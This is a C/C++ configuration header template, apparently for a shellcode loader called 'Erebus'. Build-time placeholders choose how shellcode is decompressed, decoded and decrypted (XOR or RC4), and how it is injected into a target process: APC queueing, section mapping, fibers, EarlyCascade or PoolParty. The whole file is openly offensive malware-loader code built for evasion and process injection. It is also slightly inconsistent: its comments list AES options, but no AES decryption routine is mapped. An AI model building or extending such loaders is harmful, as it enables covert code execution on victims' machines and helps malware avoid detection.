#ifndef EREBUS_CONFIG
#define EREBUS_CONFIG
#pragma once

// ============================================
// COMPRESSION CONFIGURATION
// ============================================
// Compression method used for shellcode:
// 0 = NONE        - No decompression
// 1 = LZNT1       - LZNT1 compression
// 2 = RLE         - Run-Length Encoding
#define CONFIG_COMPRESSION_TYPE {{ COMPRESSION_TYPE }}

#if CONFIG_COMPRESSION_TYPE == 1
#define DecompressShellcode erebus::DecompressionLZNT
#elif CONFIG_COMPRESSION_TYPE == 2
#define DecompressShellcode erebus::DecompressionRLE
#endif

// ============================================
// ENCODING CONFIGURATION
// ============================================
// Encoding method used for shellcode:
// 0 = NONE        - No decoding
// 1 = BASE64      - Base64 encoding
// 2 = ASCII85     - ASCII85 encoding
// 3 = ALPHA32     - ALPHA32 encoding
// 4 = WORDS256    - WORDS256 encoding
#define CONFIG_ENCODING_TYPE {{ ENCODING_TYPE }}

#if CONFIG_ENCODING_TYPE == 1
#define DecodeShellcode erebus::DecodeBase64
#elif CONFIG_ENCODING_TYPE == 2
#define DecodeShellcode erebus::DecodeASCII85
#elif CONFIG_ENCODING_TYPE == 3
#define DecodeShellcode erebus::DecodeALPHA32
#elif CONFIG_ENCODING_TYPE == 4
#define DecodeShellcode erebus::DecodeWORDS256
#endif

// ============================================
// ENCRYPTION CONFIGURATION
// ============================================
// Encryption method used for shellcode:
// 0 = NONE        - No decryption
// 1 = XOR         - Simple XOR cipher
// 2 = RC4         - RC4 stream cipher
// 3 = AES_ECB     - AES in ECB mode
// 4 = AES_CBC     - AES in CBC mode
#define CONFIG_ENCRYPTION_TYPE {{ ENCRYPTION_TYPE }}
#if CONFIG_ENCRYPTION_TYPE == 1
#define DecryptShellcode erebus::DecryptionXor
#elif CONFIG_ENCRYPTION_TYPE == 2
#define DecryptShellcode erebus::DecryptionRc4
#endif

// ============================================
// INJECTION CONFIGURATION
// ============================================

// Target process for remote injection
#define CONFIG_TARGET_PROCESS L"{{ TARGET_PROCESS }}\\0"

// Injection technique:
// 1 = NtQueueApcThread    - APC injection to suspended thread (Remote)
// 2 = NtMapViewOfSection  - Section mapping injection (Remote)
// 3 = CreateFiber         - Fiber-based execution (Self)
// 4 = EarlyCascade        - Early Bird APC injection (Remote)
// 5 = PoolParty           - Worker Factory thread pool injection (Remote)
#define CONFIG_INJECTION_TYPE {{ INJECTION_TYPE }}

#if CONFIG_INJECTION_TYPE == 3
#define CONFIG_INJECTION_MODE 2  // Self injection
#else
#define CONFIG_INJECTION_MODE 1  // Remote injection
#endif

#if CONFIG_INJECTION_TYPE == 1
#define ExecuteShellcode erebus::InjectionNtQueueApcThread
#elif CONFIG_INJECTION_TYPE == 2
#define ExecuteShellcode erebus::InjectionNtMapViewOfSection
#elif CONFIG_INJECTION_TYPE == 3
#define ExecuteShellcode erebus::InjectionCreateFiber
#elif CONFIG_INJECTION_TYPE == 4
#define ExecuteShellcode erebus::InjectionEarlyCascade
#elif CONFIG_INJECTION_TYPE == 5
#define ExecuteShellcode erebus::InjectionPoolParty
#endif

#endif
